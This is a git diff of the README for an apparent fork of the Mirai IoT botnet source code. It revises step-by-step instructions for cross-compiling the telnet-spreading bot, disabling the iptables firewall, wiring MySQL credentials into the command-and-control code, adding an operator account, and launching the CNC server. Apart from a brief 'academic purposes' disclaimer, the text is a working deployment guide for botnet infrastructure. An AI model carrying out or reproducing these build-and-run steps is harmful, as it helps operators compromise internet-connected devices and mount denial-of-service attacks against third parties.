@@ -33,7 +33,7 @@ This repository is for academic purposes, the use of this software is your
 responsibility.
 
 ## Warning
-The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/) for this repo is being identified by some AV programs as malware.  Please take caution. 
+The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/) for this repo is being identified by some AV programs as malware.  Please take caution.
 
 ## Install
 
@@ -55,15 +55,6 @@ After installing the dependency tools, follow the steps below.
 ```
 # git clone https://github.com/ware255/Mirai-Source-Code-plus.git
 # cd Mirai-Source-Code-plus/scripts
-# sudo service mysql start
-```
-Add users to mysql.
-```
-# sudo cat db.sql | mysql -uroot -proot
-# sudo mysql -uroot -proot
-> INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
-> exit
-# sudo service mysql restart
 ```
 Cross Compile
 ```
@@ -99,17 +90,45 @@ After adding and saving, enter the following command
 # mkdir ~/go
 # source ~/.bashrc
 ```
-Build bot and CNC
-Get golang requiremnts
-```
-# go get github.com/go-sql-driver/mysql
-# go get github.com/mattn/go-shellwords
-```
 In mirai folder, run build.sh script
 ```
 # cd ../mirai
 # chmod +x build.sh
 # ./build.sh release telnet
+```
+Get golang requiremnts
+```
+# go get github.com/go-sql-driver/mysql
+# go get github.com/mattn/go-shellwords
+```
+If you have iptbales/ip6tables or any firewall install disable it.
+```
+# sudo service iptables stop
+```
+Database setup<br />
+※It will ask you to set a password, make sure you remember this.
+```
+# sudo /usr/bin/mysql_secure_installation
+```
+Go to `cd cnc/` and replace the root password you just entered with the MySQL_Password.
+```
+const DatabaseAddr string   = "127.0.0.1:3306"
+const DatabaseUser string   = "root"
+const DatabasePass string   = "MySQL_Password"
+const DatabaseTable string  = "mirai"
+```
+Add users to mysql.
+```
+# cd ../scripts
+# sudo mysql -uroot -pMySQL_Password
+> INSERT INTO users VALUES (NULL, 'tashiro', 'mystrongestpassword', 0, 0, 0, 0, -1, 1, 30, '');
+> exit
+# sudo service mysql restart
+```
+Once you restart the mysql server, go to your debug folder ./mirai/release, you will seen a compiled file named cnc execute it.
+```
+# cd ../mirai/release
+# sudo ./cnc
 ```
 Build loader
 ```
